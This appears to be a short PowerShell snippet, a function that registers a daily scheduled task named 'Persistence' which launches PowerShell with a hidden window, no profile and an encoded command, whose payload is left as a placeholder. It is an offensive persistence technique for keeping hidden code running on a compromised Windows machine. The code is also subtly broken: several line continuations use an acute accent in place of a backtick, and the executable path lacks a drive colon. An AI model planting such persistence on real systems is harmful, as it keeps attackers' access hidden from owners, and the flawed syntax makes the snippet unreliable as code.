
function New-ScheduledTaskPersistence{

    $TaskName= "Persistence"

    $Trigger = New-ScheduledTaskTrigger `
        -Daily `
        -At 09:00

    $Action = New-ScheduledTaskAction ´
        -Execute "C\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" ´
        -Argument "-Sta -Nop -Window Hidden -EncodedCommand <blabla>" ´
        -WorkingDirectory "C:\Windows\System32"

    Register-ScheduledTask ´
        -Taskname $TaskName ´
        -Trigger $Trigger ´
        -Action $Action ´
        -Force 
}